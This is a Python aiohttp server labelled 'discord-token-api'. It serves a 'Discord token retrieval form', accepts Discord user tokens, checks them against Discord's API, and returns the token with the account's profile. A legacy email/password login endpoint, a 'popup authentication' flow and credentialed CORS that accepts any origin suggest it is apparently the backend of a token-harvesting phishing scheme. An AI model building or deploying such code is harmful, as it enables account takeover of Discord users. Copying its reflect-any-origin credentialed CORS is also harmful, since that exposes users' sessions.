import aiohttp
from aiohttp import web
import json
import os
import logging
import asyncio
import time
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('discord-token-api')

# Configuration
API_PORT = 8000  # Port your server is running on

# Create templates directory if it doesn't exist
templates_dir = Path("templates")
templates_dir.mkdir(exist_ok=True)

# Helper functions
async def render_template(template_name, **context):
    """Simple template renderer"""
    try:
        template_path = Path(f"templates/{template_name}")
        if not template_path.exists():
            return web.Response(text=f"Template {template_name} not found", status=500)
        
        with open(template_path, "r") as file:
            content = file.read()
            
        # Very basic template substitution
        for key, value in context.items():
            placeholder = f"{{{key}}}"
            content = content.replace(placeholder, str(value))
            
        return web.Response(text=content, content_type="text/html")
    except Exception as e:
        logger.error(f"Error rendering template: {e}")
        return web.Response(text=f"Error: {str(e)}", status=500)

# Simple rate limiting for token validation
validation_attempts = {}
MAX_VALIDATION_ATTEMPTS = 10  # Max validation attempts per IP per minute
RATE_LIMIT_WINDOW = 60  # 1 minute window

async def check_validation_rate_limit(request):
    """Check if the requester's IP is rate limited for token validation"""
    client_ip = request.remote
    current_time = int(time.time())
    
    # Clean up old entries
    for ip in list(validation_attempts.keys()):
        if current_time - validation_attempts[ip]['timestamp'] > RATE_LIMIT_WINDOW:
            del validation_attempts[ip]
    
    # Check current IP
    if client_ip in validation_attempts:
        attempt_data = validation_attempts[client_ip]
        if attempt_data['count'] >= MAX_VALIDATION_ATTEMPTS:
            if current_time - attempt_data['timestamp'] < RATE_LIMIT_WINDOW:
                return True  # Rate limited
            else:
                # Reset if window has passed
                validation_attempts[client_ip] = {'count': 1, 'timestamp': current_time}
        else:
            # Increment attempt count
            attempt_data['count'] += 1
            attempt_data['timestamp'] = current_time
    else:
        # First attempt
        validation_attempts[client_ip] = {'count': 1, 'timestamp': current_time}
    
    return False  # Not rate limited

# Route handlers
async def index(request):
    """Serve landing page with Discord token retrieval form"""
    return await render_template("index.html")

async def validate_token(request):
    """Validate a Discord token and return user info"""
    try:
        # Check rate limit for token validation
        if await check_validation_rate_limit(request):
            return web.json_response({
                'status': 'error',
                'message': 'Too many validation requests. Please try again later.'
            }, status=429)
        
        data = await request.json()
        token = data.get('token')
        
        if not token:
            return web.json_response({
                'status': 'error',
                'message': 'Token is required.'
            }, status=400)
        
        logger.info(f"Validating token from IP: {request.remote}")
        
        # Create a session to validate the token
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            user_info = await get_user_info(session, token)
            
            if user_info:
                logger.info(f"Token validation successful for user: {user_info.get('username')}")
                return web.json_response({
                    'status': 'success',
                    'token': token,
                    'user': user_info
                })
            else:
                logger.warning("Token validation failed - invalid or expired token")
                return web.json_response({
                    'status': 'error',
                    'message': 'Invalid or expired token.'
                }, status=400)
                
    except Exception as e:
        logger.error(f"Error validating token: {str(e)}")
        return web.json_response({
            'status': 'error',
            'message': 'An error occurred while validating the token.'
        }, status=500)

async def direct_login(request):
    """Handle Discord direct login with email/password (legacy endpoint - now used for token validation only)"""
    try:
        # This endpoint is now primarily used for token validation
        # The frontend uses popup authentication instead
        data = await request.json()
        
        # If a token is provided, validate it
        if data.get('token'):
            return await validate_token(request)
        
        # Legacy direct login is no longer supported
        return web.json_response({
            'status': 'error',
            'message': 'Direct login is no longer supported. Please use the popup authentication method.'
        }, status=400)
        
    except Exception as e:
        logger.error(f"Error in direct_login endpoint: {str(e)}")
        return web.json_response({
            'status': 'error',
            'message': 'An internal server error occurred.'
        }, status=500)


async def get_user_info(session, token):
    """Get user information using the token"""
    try:
        user_url = "https://discord.com/api/v9/users/@me"
        user_headers = {
            'Authorization': token
        }
        
        async with session.get(user_url, headers=user_headers) as user_resp:
            if user_resp.status == 200:
                user_info = await user_resp.json()
                logger.info(f"Successfully obtained token for user: {user_info.get('username', 'Unknown')}")
                return user_info
            else:
                logger.warning("Token verification failed")
                return None
    except Exception as e:
        logger.error(f"Error verifying token: {e}")
        return None

async def static_files(request):
    """Serve static files"""
    filename = request.match_info.get('filename')
    try:
        if filename.endswith('.css'):
            content_type = 'text/css'
        elif filename.endswith('.js'):
            content_type = 'application/javascript'
        elif filename.endswith('.png'):
            content_type = 'image/png'
        elif filename.endswith('.jpg') or filename.endswith('.jpeg'):
            content_type = 'image/jpeg'
        else:
            content_type = 'application/octet-stream'
            
        file_path = Path(f"static/{filename}")
        if not file_path.exists():
            return web.Response(text="File not found", status=404)
            
        with open(file_path, 'rb') as f:
            content = f.read()
            
        return web.Response(body=content, content_type=content_type)
    except Exception as e:
        logger.error(f"Error serving static file: {e}")
        return web.Response(text=f"Error: {str(e)}", status=500)

# CORS middleware to enable cross-origin requests with cookie handling
@web.middleware
async def cors_middleware(request, handler):
    resp = await handler(request)
    resp.headers['Access-Control-Allow-Origin'] = request.headers.get('Origin', '*')
    resp.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    resp.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, X-Captcha-Key, X-Captcha-Rqtoken'
    resp.headers['Access-Control-Allow-Credentials'] = 'true'  # Important for cookies
    
    # Set SameSite=None and Secure flags for all cookies in the response
    if 'Set-Cookie' in resp.headers:
        cookies = resp.headers.getall('Set-Cookie')
        # Clear existing cookies
        del resp.headers['Set-Cookie']
        # Add cookies back with SameSite=None; Secure
        for cookie in cookies:
            if 'SameSite=' not in cookie:
                cookie += '; SameSite=None; Secure'
            resp.headers.add('Set-Cookie', cookie)
    
    return resp

async def handle_options(request):
    """Handle preflight OPTIONS requests for CORS"""
    response = web.Response()
    response.headers['Access-Control-Allow-Origin'] = request.headers.get('Origin', '*')
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, X-Captcha-Key, X-Captcha-Rqtoken'
    response.headers['Access-Control-Allow-Credentials'] = 'true'  # Important for cookies
    response.headers['Access-Control-Max-Age'] = '86400'  # 24 hours
    return response

async def main():
    # Initialize the application
    app = web.Application(middlewares=[cors_middleware])
    
    # Configure routes
    app.router.add_get('/', index)
    app.router.add_get('/static/{filename}', static_files)
    
    # Token validation endpoint (primary endpoint for popup method)
    app.router.add_post('/validate-token', validate_token)
    
    # Legacy direct login endpoint (now redirects to popup method)
    app.router.add_post('/direct-login', direct_login)
    
    # Add OPTIONS handlers for CORS preflight requests
    app.router.add_options('/{tail:.*}', handle_options)
    
    # Start the server
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', API_PORT)
    await site.start()
    
    print(f"Discord Token API server started at http://0.0.0.0:{API_PORT}")
    
    # Keep the server running
    while True:
        await asyncio.sleep(3600)  # Sleep for an hour (or forever)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Server shutdown requested")
    except Exception as e:
        logger.error(f"Server error: {e}")
        print(f"Server error: {e}")
